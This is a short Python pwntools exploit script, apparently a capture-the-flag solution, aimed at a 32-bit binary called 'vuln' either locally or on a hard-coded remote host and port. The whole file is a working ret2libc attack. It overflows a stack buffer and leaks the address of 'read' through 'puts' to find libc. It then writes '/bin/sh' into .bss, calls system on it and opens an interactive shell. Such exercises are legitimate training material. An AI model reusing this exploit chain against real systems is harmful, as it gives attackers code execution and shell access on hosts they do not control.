import time, sys
from pwn import *

# local process envirnoment
LOCAL = True

#retmote args
remote_host = "118.31.18.29"
remote_port = 20003

elf_sanbox = ELF("sandbox")
elf_vuln = ELF("./vuln")

context.clear(arch='i386')

argv = ["./sandbox", "./vuln", "hh"]

if LOCAL:
    #context.log_level = "debug"
    read_off = 0xD5AF0
    system_off = 0x3ADA0
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    #io = process(argv, env=mine_env)
    io = process("./vuln", env=mine_env)
else:
    read_off = 0xD5AF0
    system_off = 0x3ADA0
    io = remote(remote_host, remote_port)

def s_exp():
    bss_tdatddr = 0x804A064
    main_addr = 0x804865B
    vuln_func = 0x80485CB
    rop = ROP("./vuln")
    payload='a'*0x30+chr(0x48)
    payload+=p32(elf_vuln.plt["puts"])
    payload+=p32(vuln_func)
    payload+=p32(elf_vuln.got["read"])
    io.sendline(payload)
    io.recvline()
    data = io.recv(4)
    read_addr = u32(data)
    print "read addr:", hex(read_addr)
    libc_addr = read_addr-read_off
    print "libc addr:", hex(libc_addr)
    system_addr = libc_addr+system_off

    payload='a'*0x30+chr(0x48)
    payload+=p32(elf_vuln.plt["read"])
    payload+=p32(vuln_func)
    payload+=p32(0)
    payload+=p32(bss_tdatddr)
    payload+=p32(8)
    io.sendline(payload)
    time.sleep(0.01)
    io.send("/bin/sh\x00")

    payload='a'*0x30+chr(0x48)
    payload+=p32(system_addr)
    payload+=p32(vuln_func)
    payload+=p32(bss_tdatddr)
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
